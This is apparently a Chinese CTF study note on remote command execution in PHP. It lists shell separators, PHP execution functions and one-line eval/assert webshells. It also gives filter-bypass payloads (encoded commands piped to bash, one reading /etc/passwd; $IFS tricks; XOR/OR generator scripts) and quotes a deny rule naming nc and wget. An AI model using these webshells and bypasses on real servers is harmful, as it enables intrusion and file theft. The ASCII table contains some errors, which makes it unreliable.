

# 命令执行（Remote Command Excution）

应用程序的某些功能需要调用可以执行*系统命令*的函数，如果这些函数或者函数的参数能被用户控制，就可能通过命令连接符将恶意命令拼接到正常函数中，从而任意执行系统命令。



## 00ASCII码表 完整版

| ASCII值 | 控制字符 | ASCII值 | 控制字符 | ASCII值 | 控制字符 | ASCII值 | 控制字符 |
| ------- | -------- | ------- | -------- | ------- | -------- | ------- | -------- |
| 0       | NUT      | 32      | (space)  | 64      | @        | 96      | 、       |
| 1       | SOH      | 33      | !        | 65      | A        | 97      | a        |
| 2       | STX      | 34      | ”        | 66      | B        | 98      | b        |
| 3       | ETX      | 35      | #        | 67      | C        | 99      | c        |
| 4       | EOT      | 36      | $        | 68      | D        | 100     | d        |
| 5       | ENQ      | 37      | %        | 69      | E        | 101     | e        |
| 6       | ACK      | 38      | &        | 70      | F        | 102     | f        |
| 7       | BEL      | 39      | ,        | 71      | G        | 103     | g        |
| 8       | BS       | 40      | (        | 72      | H        | 104     | h        |
| 9       | HT       | 41      | )        | 73      | I        | 105     | i        |
| 10      | LF       | 42      | *        | 74      | J        | 106     | j        |
| 11      | VT       | 43      | +        | 75      | K        | 107     | k        |
| 12      | FF       | 44      | ,        | 76      | L        | 108     | l        |
| 13      | CR       | 45      | -        | 77      | M        | 109     | m        |
| 14      | SO       | 46      | .        | 78      | N        | 110     | n        |
| 15      | SI       | 47      | /        | 79      | O        | 111     | o        |
| 16      | DLE      | 48      | 0        | 80      | P        | 112     | p        |
| 17      | DCI      | 49      | 1        | 81      | Q        | 113     | q        |
| 18      | DC2      | 50      | 2        | 82      | R        | 114     | r        |
| 19      | DC3      | 51      | 3        | 83      | X        | 115     | s        |
| 20      | DC4      | 52      | 4        | 84      | T        | 116     | t        |
| 21      | NAK      | 53      | 5        | 85      | U        | 117     | u        |
| 22      | SYN      | 54      | 6        | 86      | V        | 118     | v        |
| 23      | TB       | 55      | 7        | 87      | W        | 119     | w        |
| 24      | CAN      | 56      | 8        | 88      | X        | 120     | x        |
| 25      | EM       | 57      | 9        | 89      | Y        | 121     | y        |
| 26      | SUB      | 58      | :        | 90      | Z        | 122     | z        |
| 27      | ESC      | 59      | ;        | 91      | [        | 123     | {        |
| 28      | FS       | 60      | <        | 92      | /        | 124     | \|       |
| 29      | GS       | 61      | =        | 93      | ]        | 125     | }        |
| 30      | RS       | 62      | >        | 94      | ^        | 126     | ~        |
| 31      | US       | 63      | ?        | 95      | —        | 127     | DEL      |



## 01常见系统命令

系统命令，简单解释就是在系统终端可执行的预定义命令，就是大家常见的黑框框。在linux操作系统中，预定义命令默认存储位置为/bin目录，而windows操作系统的预定义命令默认存储位置为C:\Windows\System32，下面将针对linux和win的系统命令做简单介绍。

### 1.1 管道符

在win和linux这两种操作系统中，我们可以利用管道符来同时执行多条命令

```
windows：
‘|’ 直接执行后面的语句
‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
‘&’ 前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

linux：
Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同
```



### 1.2 通配符

在Linux中，有几种常见的通配符：

```
*   匹配零个或多个字符
?   匹配任意单个字符
[]  匹配方括号内的任意一个字符
{}  匹配花括号内的任意字符串
```

**例**

```
若当前目录只存在一个名为flag的文件
cat flag <==> cat fla?  <==>  cat f*
```



### 1.3 重定向

在[Linux系统](https://so.csdn.net/so/search?q=Linux系统&spm=1001.2101.3001.7020)中，重定向符号用于控制命令的输入、输出以及错误流的流向

在linux操作系统中有两种常见的输出重定向符号

**1.>符号**

用于将命令的标准输出重定向到指定的文件，如果文件不存在，则会创建文件；如果文件已经存在，则会覆盖文件内容。

```
ls > file.txt    //将ls的执行结果写入file.txt中
>file.txt        //创建名为file.txt的文件
```

**2.>>符号**

将命令的标准输出重定向到指定的文件，但与`>` 不同的是，如果文件已经存在，`>>` 会将输出追加到文件末尾而不是覆盖文件内容。

```
ls >> file.txt
```

还有一个常见的输入重定向符号

**1.<符号**

从指定文件中读取内容，作为命令的标准输入。输入单个文件。

```
cat < file.txt
```

**2.<<符号**

从指定文件中读取内容，作为命令的标准输入。输入多个文件。

```
cat << file.txt
```



### 1.4 常见系统命令

在高级语言当中，系统命令通常需要特定的函数才能执行。例如php中的

|   system()   |
| :----------: |
|  passthru()  |
|    exec()    |
| shell_exec() |
|   popen()    |
| proc_open()  |
| pcntl_exec() |
|      ``      |

python中的例如等

| os.system() |
| :---------: |

根据函数不同，其所需参数以及回显情况等都会略有不同，需要根据实际情况进行调整

#### 1.4.1 windows

| 命令     | 实际效果                                   |
| -------- | ------------------------------------------ |
| ipconfig | 主要用来查看当前机器内、外网ip             |
| type     | type filename 查看文件内容                 |
| cd       | 目录跳转                                   |
| ping     | ping ip或者url 主要用来判断某机器是否可达  |
| dir      | 列出当前目录                               |
| whoami   | 查看当前用户，主要用于判断是否可以命令执行 |

#### 1.4.2 linux

**基础命令**

| 命令     | 实际效果                   |
| -------- | -------------------------- |
| ls       | 列出当前目录               |
| cd       | 目录跳转                   |
| rm       | 删除                       |
| mv       | 重命名                     |
| whoami   | 查看当前用户               |
| uname -a | 列出内核版本等详细系统讯息 |
| ifconfig | 查看当前机器内外网ip       |
| ping     | 判断目标机器是否可达       |
| touch    | 创建文件                   |
| mkdir    | 创建目录                   |

在ctf比赛当中，最常见的就是文件读取命令的绕过，下面是一些常见的**文件读取命令**   

| 命令           | 实际效果                               |
| -------------- | -------------------------------------- |
| cat            | 文件读取                               |
| tac            | 文件读取（行倒序输出）                 |
| more           | 文件读取（一页一页显示）               |
| less           | 文件读取（一页一页显示，可翻页）       |
| head           | 文件读取（显示头几行）                 |
| tail           | 文件读取（显示最后几行）               |
| nl             | 文件读取（会输出行号）                 |
| vim/vi         | 文本编辑器，可用于内容查看             |
| nano           | 文本编辑器，可用于内容查看             |
| emacs          | 文本编辑器，可用于内容查看             |
| sed -n '1,10p' | 文件读取（显示前10行）                 |
| rev            | 文件读取（倒序输出）                   |
| base64         | 文件读取（以base64形式输出）           |
| strings        | 文件读取（提取文件中可输出的字符串）   |
| xxd            | 文件读取（二进制形式输出）             |
| hexdump        | 文件读取（16进制形式输出）             |
| od             | 文件读取（8进制形式输出）              |
| uniq           | 文件读取（会去掉重复行）               |
| cp             | 文件复制（可用于突破目标文件权限限制） |



#### 1.4.3 其它命令

除了以上的常见命令外还有其它的一些常用命令



##### **find**

常用于在linux系统中查找某文件（支持通配符）的具体位置

```
find / -name flag
find / -name f*
find / -name fla?
/为查找的起始根目录，以上命令会以/（根目录）为查找根目录，在其以及其子目录中查找符合后续命名规则的文件
```





##### **sed**

在某些情况需要对文件内容进行适当修改，但题目环境并未提供vi等文本编辑器，此时可以利用sed达到精准替换某行的目的

```
实现格式为：
sed -i '行数s/原内容/替换为的内容/' 文件名

sed -i '2s/x\.x\.x\.x/150.158.24.228/' filename
sed -i '3s/7002/7000/' filename
sed -i '4s/.*//' filename
```

PS：

```
1.该命令支持通配符
2.该命令对于特殊符号需要用\进行转义，如上述的例1中的.
```





##### **echo**

如果需要大规模写入内容，可以使用base64编码防止数据丢失，再结合echo将内容写入指定文件

```
实现格式为：
echo 'base64编码的数据' | base64 -d > filename
```



**另附录**

```
#常见符号
/ #根目录
. #当前目录
.. #上一级目录(在后面加一个/也可以)
~ #家目录
-------------------------------------------------------------------------------
-
# cd系列（进入目录）
#进入到系统根目录
cd /
#进入到当前目录
cd .
#返回上层目录
cd ..
#进入指定目录/tmp
cd /tmp
#进入当前用户的家目录
cd ~
#回到刚才所在的目录
cd
#ls系列（显示目录以及文件参数）
#显示当前目录的内容(有颜色)
ls
#显示指定目录/tmp 的内容
ls /tmp
#列出文件和文件夹的基本属性和详细信息
ls -l
#列出文件和文件夹的基本属性和详细信息
ll
#列出当前目录的全部内容，包括隐藏文件(在文件和文件夹前面加“.”隐藏)
ls -a
#(tip: scandir() glob() )
-------------------------------------------------------------------------------
-
#文件内容系列
##cat 命令用于连接文件并打印到标准输出设备上。
#查看/etc/coco文件
cat /etc/coco
其它查看的命令：(通常过滤可用)
cat 由第一行开始显示内容，并将所有内容输出
tac 从最后一行倒序显示内容，并将所有内容输出
more 根据窗口大小，一页一页的现实文件内容
less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
head 只显示头几行
tail 只显示最后几行
nl 类似于cat -n，显示时输出行号

##rm命令用于删除一个文件或者目录。
#删除coco_2020文件
rm coco_2020

##find命令用来在指定目录下查找文件，任何位于参数之前的字符串都将被视为需查找的目录名。如果使用该
命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并且将查找到的子目录和文件全部
进行显示。
#在当前目录下查找以test开头的文件
find test*

##touch命令用于修改文件或者目录的时间属性，包括存取时间和更改时间。若文件不存在，系统会建立一个
新的文件。
#在当前目录下创建coco文件
touch coco

##cp命令主要用于复制文件或目录。
#复制vivi文件到/tmp 目录下
cp vivi /tmp

##mv 命令用来为文件或目录改名，或将文件、目录移入其它位置。
#移动coco_2020文件到/tmp 目录下
mv coco_2020 /tmp

#Windows管道符
管道符 作用 举例
| 直接执行后面的语句 ping 127.0.0.1|ls
|| 前面的语句执行出错则执行后面的语句 ping 127.0.0.1||ls
& 前面的语句为假则执行后面的语句 ping 127.0.0.1&ls
&& 前面的语句为假，直接出错，前面的语句为真，执行后面的语句 ping 127.0.0.1&&ls
#linux管道符
; 执行完前面的语句再执行后面的。各个命令都会进行，但不一定都执行成功
ping 127.0.0.1; ls
| 显示后面语句的执行结果。 ping 127.0.0.1 | ls
|| 前面的语句执行出错才执行后面的语句 ping 127.0.0.1||ls
& 前面的语句为假则执行后面的语句，前面的语句不会影响后面的语句执行
ping 127.0.0.1&ls
&& 前面的语句为假，直接出错也不执行后面的语句，只有前面的语句为真，执行后面的语句
ping 127.0.0.1&&ls
```



## 02命令代码执行函数

### 1.php命令执行函数

以PHP为例，以下的这些函数可以执行系统命令。当我们可以控制这些函数的参数时，就能运行我们想运行的命令，从而进行攻击。

```
#system()
输出并返回最后一行shell结果。
#passthru()
只调用命令，把命令的运行结果原样地直接输出到标准输出设备上，即以二进制流形式输出。
#exec()
不输出回显，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。
#shell_exec()
通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回，回显用echo、print。
#popen()
函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读#和
写。函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行
#printf()
#print_r()
```

参考链接：https://blog.csdn.net/Luodehahajiang/article/details/130663809

### 2.php代码执行函数

以PHP为例，有的应用程序中提供了一些可以将字符串作为代码执行的函数，例如PHP中的eval函数，可以将改函数的参数当做PHP代码来执行。如果对这些函数的参数控制不严格，就可能会被攻击者利用，执行恶意代码

```
#eval()
传入的参数必须为PHP代码，既需要以分号结尾。
命令执行：/?cmd=system('ls');
<?php @eval($_POST['cmd']);?>

#assert()
assert函数是直接将传入的参数当成PHP代码，不需要以分号结尾（特别注意），有时加上分号不会显示结
果。
命令执行: /?cmd=system(whoami)
<?php @assert($_POST['cmd']);?>

#create_function()
#创建匿名函数执行代码
#执行命令和上传文件参考eval函数(必须加分号)。
$func =create_function('',$_POST['cmd']);$func();

#preg_replace
#preg_replace('正则规则','替换字符'，'目标字符')
#执行命令和上传文件参考assert函数(不需要加分号)。
#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏
洞。
preg_replace("/test/e",$_POST["cmd"],"jutst test");

#call_use_func()
#传入的参数作为assert函数的参数
#cmd=system(whoami)
call_user_func("assert",$_POST['cmd']);

#call_use_func_array()
#将传入的参数作为数组的第一个值传递给assert函数
#cmd=system(whoami)
$cmd=$_POST['cmd'];
$array[0]=$cmd;
call_user_func_array("assert",$array);
```

更多的可以自行到网上查找资料。

参考：https://blog.csdn.net/weixin_39934520/article/details/109231480





## 03常见过滤

### 1、关键字过滤，例如flag ，cat , system()

#### 替代法

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2>%261 //报错出文件内容

构造 /bin/cat or /bin/c?t (bin目录下有cat命令)
```

#### 使用转义符号 

```
ca\t /fl\ag
ca''t fl''ag
ca""t fl""ag
```

#### 拼接法

```
a=fl;b=ag.php;cat$IFS$a$b
```

#### 变量绕过

```
a=c;b=a;c=t;$a$b$c 1.txt
```

#### 使用空变量$*和$@，$x,${x}绕过

```
ca$*t flag
ca$@t flag
ca$5t flag
ca${5}t flag
```

#### 反引号绕过

```
cat `ls`;
```

#### 编码绕过

##### 1）base64

```python
import base64
S = b'cat flag.php'
e64 = base64.b64encode(S)  
#参数s的类型必须是字节包（bytes）  b64decode 的参数 s 可以是字节包(bytes)，也可以是字符串(str)。
print(e64)
# echo Y2F0IGZsYWcucGhw | base64 -d | bash
# `echo Y2F0IGZsYWcucGhw | base64 -d`
# $(echo Y2F0IGZsYWcucGhw | base64 -d)

# ?cmd=passthru('`echo Y2F0IGZsYWcucGhw | base64 -d`')
```

##### 2）8进制

##### 3）16进制

```
echo "636174202F6574632F706173737764" | xxd -r -p|bash
```

##### 4）ASCII码

```python
import binascii
s = b"tac flag"
h = binascii.b2a_hex(s)
print(h)
# echo "74616320666c61672e706870" |xxd -r -p|bash
# ?cmd=passthru('echo "74616320666c61672e706870"|xxd -r -p|bash');
```

### 2、正则匹配绕过   preg_match函数

#### 1）通配符？ * 绕过  

例如：过滤/1010/flag.php

```
cat 1010/flag.php
cat ????/fla*

*可以代表任何字符串； ？仅代表单个字符串，但此单字必须存在
```

**例题：ctfshow web入门 web29**

#### 2）利用未初始化变量，使用$u绕过

例如: 过滤/1010/flag.php中的1010



当变量没有被显式地赋予一个值时，它的值是不确定的，这种不确定性可以被利用来构造特定的输入，使得在执行代码或进行其他操作时，这些未初始化的变量能够按照攻击者的意图进行变化

```
cat 1010/flag.php
cat 1010$u/flag.php
```

### 2、过滤空格

```
$IFS
{cat,flag.php} 				--这里把，替换成了空格键
%20 						--代表space键
\x20 						--代表space键，eval类中可用
%09 						--需要php环境，如										cat%09flag.php
\x09 						--代表space键，eval类中可用
${IFS} 						--单纯cat$IFS2,IFS2被bash解					释器当做变量名，输不出来结果，加一个{}就固定					了变量名，如cat${IFS2}flag.php
$IFS$9 						--后面加个$与{}类似，起截断作							用，$9是当前系统shell进程第九个								参数持有者，始终为空字符串，如cat$IFS2$9flag.php
< 							--重定向，如cat<flag.php
<> 							--重定向，如cat<>flag.php
```

**例题 web入门web31**

#### 2.1字符串拼接绕过

```
a=l;b=s;c=/;$a$b $c
```

定义变量a为l，b为s，c为/，执行命令$a$b $c即ls /

#### 2.2base64编码绕过

```
echo MTIzCg==|base64 -d 		其将会打印123
echo bHMgLw== | base64 -d | bash
`echo bHMgLw== | base64 -d`			 ==>三种结果皆为ls /
echo bHMgLw== | base64 -d | sh
```

#### 2.316进制编码绕过

生成脚本

```
?php
$a = 'ls /';
echo bin2hex($a); //6c73202f
?>
```

payload

```
echo 6c73202f | xxd -r -p | bash
`echo 6c73 | xxd -r -p`
echo `6c73202f` | xxd -r -p | sh > 1.txt
```





### 3、过滤目录分隔符/

```
采用多管道命令
;cd flag;cat *
例如：127.0.0.1||cd flag_is_here;cat flag_262431433226364.php
```

### 4、过滤分隔符|&；

```
; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
& //两条命令都会执行
&& //两条命令都会执行（以上参考之前的内容）
%0a //换行符 ?cmd=123%0als
%0d //回车符号 ?cmd=123%0dls

用?>代替;
在php中可以用?>来代替最后的一个;，因为php遇到定界符关闭标签会自动在末尾加上一个分号。
```

### 5、过滤括号

#### 1）使用不用括号的函数

##### echo

```
echo `cat /flag`
```

##### require

```
require '/flag'
```

#### 2）使用取反

```
require '/flag'
```

### 6、过滤.

```
?c=eval($_GET[1]);/?>&1=system("tacflag.php");

?c=include($_GET[1]);/?>&1=system("tacflag.php");
```

使用1作为跳板绕过了正则匹配的过滤

```
?filename=http:/127.0.0.1/phpinfo.txt
```

**例题 web32 web36**   伪协议



web32payload

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```



#### 6.1绕过ip中的句点

```
网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。
可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。
```



### 7、无字母数字类rce

简单来说，无字母数字rce就是把我们可控参数中的数字和字母都ban掉了，我们需要通过不可见字符的
运算构造出可见字符，并执行相应命令，下面的绕过姿势本质都是通过不可见字符之间的关系运算构造
出我们所需要的字符串并执行我们的恶意命令。

#### 7.1取反绕过

通过取反操作使得原命令变为不可见字符，绕过waf检测，在eval执行时再通过取反操作还原为原恶意命
令，进行执行任意恶意代码。

```php
<?php
//在命令行中运行
fwrite(STDOUT,'[+]your function: ');
$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
fwrite(STDOUT,'[+]your command: ');
$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```



#### 7.2异或绕过

通过不可见字符之间的异或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每
次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可

xor.php

```php
<?php
/*author yu22x*/
$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) {
    for ($j=0; $j <256 ; $j++) {
        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9A-Z]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg ,
                hex2bin($hex_j))){
            echo "";
        }
        else{
            $a='%'.$hex_i;
            $b='%'.$hex_j;
            $c=(urldecode($a)^urldecode($b));
            if (ord($c)>=32&ord($c)<=126) {
                $contents=$contents.$c." ".$a." ".$b."\n";
            }
        }
    }
}
fwrite($myfile,$contents);
fclose($myfile);
```

xor.py

```python
import requests
import urllib
from sys import *
import os


def action(arg):
	s1 = ""
	s2 = ""
	for i in arg:
		f = open("xor_rce.txt", "r")
		while True:
			t = f.readline()
			if t == "":
				break
			if t[0] == i:
			# print(i)
				s1 += t[2:5]
				s2 += t[6:9]
				break
		f.close()
	output = "(\"" + s1 + "\"^\"" + s2 + "\")"
	return (output)


while True:
	param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
	print(param)
```

（附上xor.txt

#### 7.3或绕过

通过不可见字符之间的或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次
使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可

or.php

```php
<?php
$myfile = fopen("or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) {
for ($j=0; $j <256 ; $j++) {
if($i<16){
$hex_i='0'.dechex($i);
}
else{
$hex_i=dechex($i);
}
if($j<16){
$hex_j='0'.dechex($j);
}
else{
$hex_j=dechex($j);
}
$preg = '/[b-df-km-uw-z0-9\+\~\{\}]+/i';
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg ,
hex2bin($hex_j))){
echo "";
}
else{
$a='%'.$hex_i;
$b='%'.$hex_j;
$c=(urldecode($a)|urldecode($b));
if (ord($c)>=32&ord($c)<=126) {
$contents=$contents.$c." ".$a." ".$b."\n";
}
}
}
}
fwrite($myfile,$contents);
fclose($myfile);
```

or.py

```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os


os.system("php 或绕过_or.php") # 没有将php写入环境变量需手动运行


def action(arg):
	s1 = ""
	s2 = ""
	for i in arg:
		f = open("or.txt", "r")
		while True:
			t = f.readline()
			if t == "":
				break
			if t[0] == i:
				# print(i)
				s1 += t[2:5]
				s2 += t[6:9]
				break
		f.close()
	output = "(\"" + s1 + "\"|\"" + s2 + "\")"
	return (output)
	
	
while True:
	param = action(input("\n[+] your function：")) + action(input("[+]your command："))+ ";"
	print(param)
```

(附上or.txt



### 8、长度限制绕过

示例代码

```php
<?php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("111");
    }
} 
```

此题利用substr函数对eval的代码进行了限制

```
get传参   F=`$F `; sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval("`$F `;");
我们把原来的$F带进去
eval("``$F `;sleep 3`");
也就是说最终会执行  ` `$F `;sleep 3 ` == shell_exec("`$F `; sleep 3");
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了，将sleep 3换成我们2.1.1节中所讲的操作即可得到答案
```





参考网站：https://zhuanlan.zhihu.com/p/391439312

更多的靠自己积累。